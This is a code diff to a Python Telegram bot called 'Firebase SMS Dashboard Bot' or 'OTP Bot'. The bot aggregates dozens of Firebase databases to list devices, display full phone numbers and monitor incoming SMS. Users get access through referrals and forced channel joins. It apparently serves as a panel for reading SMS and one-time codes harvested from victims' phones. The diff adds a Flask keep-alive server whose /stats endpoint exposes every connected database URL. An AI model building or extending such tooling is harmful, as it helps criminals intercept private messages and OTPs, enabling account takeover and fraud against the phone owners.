@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Firebase SMS Dashboard Bot — FINAL v2
+Firebase SMS Dashboard Bot — FINAL v2 (Flask Keep-Alive Edition)
 - Multi-Firebase (40)
 - AUTO REFRESH every 30s
 - BULK Firebase add (extract URLs from any text)
@@ -12,6 +12,7 @@ Firebase SMS Dashboard Bot — FINAL v2
 - SMS monitor auto-stop on access revoke
 - SMS monitor idle timeout (10 min no button tap)
 - Admin Gift Access (single user / all users)
+- ⚡ Flask keep-alive server (health check endpoint)
 """
 
 import os
@@ -22,12 +23,14 @@ import asyncio
 import logging
 import gc
 import random
+import threading
 from html import escape as html_escape
 from collections import Counter
 from datetime import datetime
 from typing import Optional, Dict, List, Tuple, Set
 
 import aiohttp
+from flask import Flask, jsonify
 from telegram import (
     Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
 )
@@ -63,7 +66,6 @@ SMS_MONITOR_DURATION = 300
 SMS_MONITOR_IDLE_TIMEOUT = 600
 ADMIN_PANEL_EDIT_INTERVAL = 5
 
-# ⚡ NEW: 30 second auto-refresh
 ADMIN_DEVICE_REFRESH_INTERVAL = 30
 
 WELCOME_IMAGE_URL = "https://i.ibb.co/CK3s8vzR/Gemini-Generated-Image-en17gcen17gcen17.png"
@@ -82,6 +84,10 @@ REFERRAL_DB_FILE = os.getenv("REFERRAL_DB_FILE", "referrals.json")
 
 ACCESS_CHECK_INTERVAL = 30
 
+# ⚡ Flask config
+FLASK_HOST = os.getenv("FLASK_HOST", "0.0.0.0")
+FLASK_PORT = int(os.getenv("FLASK_PORT", os.getenv("PORT", 8080)))
+
 DEFAULT_CHANNELS = [
     {"id": "@axxuloots", "label": "@axxuloots", "url": "https://t.me/axxuloots"},
     {"id": "@KALUASC", "label": "@KALUASC", "url": "https://t.me/KALUASC"},
@@ -89,11 +95,86 @@ DEFAULT_CHANNELS = [
     {"id": "@vishalxupdate", "label": "@vishalxupdate", "url": "https://t.me/vishalxupdate"},
 ]
 
-# ⚡ NEW: Firebase URL extractor — aas-paas ka text ignore karega
 FIREBASE_URL_REGEX = re.compile(
     r'https?://[A-Za-z0-9\-_.]+(?:-default-rtdb)?(?:\.firebaseio\.com|\.firebasedatabase\.app)(?:/[^\s\'"<>()\[\]{}]*)?',
     re.IGNORECASE,
 )
+
+# ============================================================
+# FLASK KEEP-ALIVE APP
+# ============================================================
+flask_app = Flask(__name__)
+BOT_START_TIME = time.time()
+
+
+@flask_app.route("/", methods=["GET"])
+def flask_root():
+    try:
+        uptime = int(time.time() - BOT_START_TIME)
+        return jsonify({
+            "status": "ok",
+            "service": "Firebase SMS Bot",
+            "version": "FINAL v2",
+            "uptime_seconds": uptime,
+            "bot_username": BOT_USERNAME,
+            "firebases": len(global_fb_list),
+            "users": len(known_users),
+            "active_sessions": len(user_sessions),
+            "active_sms_monitors": len(sms_monitor_tasks),
+            "maintenance_mode": maintenance_mode,
+            "captcha_enabled": captcha_enabled,
+            "server_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        }), 200
+    except Exception as exc:
+        logger.error("flask root error: %s", exc)
+        return jsonify({"status": "error", "message": str(exc)}), 500
+
+
+@flask_app.route("/health", methods=["GET"])
+@flask_app.route("/healthz", methods=["GET"])
+@flask_app.route("/ping", methods=["GET"])
+def flask_health():
+    return "OK", 200
+
+
+@flask_app.route("/stats", methods=["GET"])
+def flask_stats():
+    try:
+        return jsonify({
+            "firebases": [
+                {"tag": tag, "url": url, "host": fb_host_short(url)}
+                for url, tag in global_fb_list
+            ],
+            "per_fb": global_device_cache.get("per_fb", {}),
+            "online_devices": global_device_cache.get("online_count", 0),
+            "offline_devices": global_device_cache.get("offline_count", 0),
+            "last_refresh": global_device_cache.get("updated_at", ""),
+        }), 200
+    except Exception as exc:
+        return jsonify({"status": "error", "message": str(exc)}), 500
+
+
+def _run_flask():
+    """Flask ko alag daemon thread me chalao — bot ke saath parallel."""
+    try:
+        logger.info("🌐 Starting Flask keep-alive server on %s:%s", FLASK_HOST, FLASK_PORT)
+        flask_app.run(
+            host=FLASK_HOST,
+            port=FLASK_PORT,
+            debug=False,
+            use_reloader=False,
+            threaded=True,
+        )
+    except Exception as exc:
+        logger.error("Flask server crashed: %s", exc)
+
+
+def start_flask_thread():
+    """Start Flask in background daemon thread."""
+    t = threading.Thread(target=_run_flask, name="FlaskKeepAlive", daemon=True)
+    t.start()
+    return t
+
 
 # ============================================================
 # FILE HELPERS
@@ -424,9 +505,7 @@ def normalize_fb_url(url: str) -> Optional[str]:
         return None
 
 
-# ⚡ NEW: Bulk Firebase URL extractor
 def extract_firebase_urls(text: str) -> List[str]:
-    """Kisi bhi text se saare Firebase URL nikalta hai (aas-paas ka text ignore)."""
     found: List[str] = []
     seen: Set[str] = set()
     if not text:
@@ -437,7 +516,6 @@ def extract_firebase_urls(text: str) -> List[str]:
             seen.add(norm)
             found.append(norm)
     if not found:
-        # fallback: agar koi plain URL ho bina regex match ke
         for token in re.split(r'[\s,;]+', text):
             norm = normalize_fb_url(token)
             if norm and norm not in seen:
@@ -565,7 +643,6 @@ def _get_device_name(info, cid):
     return cid
 
 
-# ⚡ MODIFIED: full/pure phone number (no truncation)
 def _get_mob_no(info):
     if not isinstance(info, dict):
         return ""
@@ -576,7 +653,6 @@ def _get_mob_no(info):
     digits = re.sub(r"\D", "", str(raw))
     if not digits:
         return ""
-    # Pura number dikhao — koi digit strip mat karo
     return digits
 
 
@@ -926,7 +1002,6 @@ async def _global_device_refresh_loop():
         try:
             await refresh_global_device_cache()
             _last_refresh_time = time.monotonic()
-            # ⚡ 30 second auto-refresh
             await asyncio.sleep(ADMIN_DEVICE_REFRESH_INTERVAL)
         except asyncio.CancelledError:
             raise
@@ -1659,7 +1734,7 @@ async def _show_cached_device_list(q, sess):
 
 
 # ============================================================
-# DEVICE VIEW BUILDER (reusable)
+# DEVICE VIEW BUILDER
 # ============================================================
 def _build_device_view(device_id: str, info: dict):
     tag = info.get("fb_tag", "?")
@@ -1955,7 +2030,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     text = (update.message.text or "").strip()
 
-    # ---------- GIFT SINGLE ----------
     if action == "gift_single":
         parts = text.split()
         if len(parts) != 2:
@@ -2003,7 +2077,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown", reply_markup=admin_panel_kb())
         return
 
-    # ---------- GIFT ALL ----------
     if action == "gift_all":
         try:
             hours = float(text.strip())
@@ -2046,7 +2119,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown", reply_markup=admin_panel_kb())
         return
 
-    # ---------- ⚡ BULK ADD FIREBASE ----------
     if action == "add_firebase":
         urls = extract_firebase_urls(text)
         if not urls:
@@ -2159,7 +2231,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 reply_markup=admin_panel_kb())
         return
 
-    # ---------- ADD CHANNEL ----------
     if action == "add_channel":
         username = text
         if username.startswith("https://t.me/"):
@@ -2193,7 +2264,6 @@ async def admin_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode="Markdown", reply_markup=admin_panel_kb())
         return
 
-    # ---------- BROADCAST ----------
     if action == "broadcast":
         context.user_data.pop("admin_action", None)
         sent = failed = 0
@@ -2573,6 +2643,7 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"💾 Active sessions: `{len(user_sessions)}`\n"
             f"📨 Active SMS monitors: `{len(sms_monitor_tasks)}`\n"
             f"⚡ Auto-refresh: `{ADMIN_DEVICE_REFRESH_INTERVAL}s`\n"
+            f"🌐 Flask: `{FLASK_HOST}:{FLASK_PORT}`\n"
             f"🔐 Captcha: `{'ON' if captcha_enabled else 'OFF'}`",
             parse_mode="Markdown", reply_markup=admin_back_kb())
         return
@@ -3136,7 +3207,7 @@ async def _maintenance_loop(bot):
                                 reply_markup=_force_join_kb())
                             logger.info("access restricted uid=%s (channel leave)", uid)
                         except Exception as exc:
-                            logger.info("could not notify restricted %s: %s", uid, exc)
+                            logger.info("could not restrict notify %s: %s", uid, exc)
         except asyncio.CancelledError:
             raise
         except Exception as e:
@@ -3177,7 +3248,7 @@ async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_
 def main():
     global bot_instance
     print("=" * 60)
-    print("  Firebase Connector — OTP Bot FINAL v2")
+    print("  Firebase Connector — OTP Bot FINAL v2 (Flask)")
     print(f"  Max Firebases: {MAX_FIREBASES}")
     print(f"  Global FBs: {len(global_fb_list)}")
     print(f"  Force-join: {len(REQUIRED_CHANNELS)}")
@@ -3185,7 +3256,11 @@ def main():
     print(f"  Referral: 1 refer = {REFERRAL_HOURS} hours")
     print(f"  Auto-refresh: {ADMIN_DEVICE_REFRESH_INTERVAL}s ⚡")
     print(f"  SMS Monitor idle timeout: {SMS_MONITOR_IDLE_TIMEOUT // 60} minutes")
+    print(f"  Flask keep-alive: {FLASK_HOST}:{FLASK_PORT} 🌐")
     print("=" * 60)
+
+    # ⚡ Flask keep-alive server start karo (background daemon thread)
+    start_flask_thread()
 
     app = Application.builder().token(BOT_TOKEN).build()
     bot_instance = app.bot
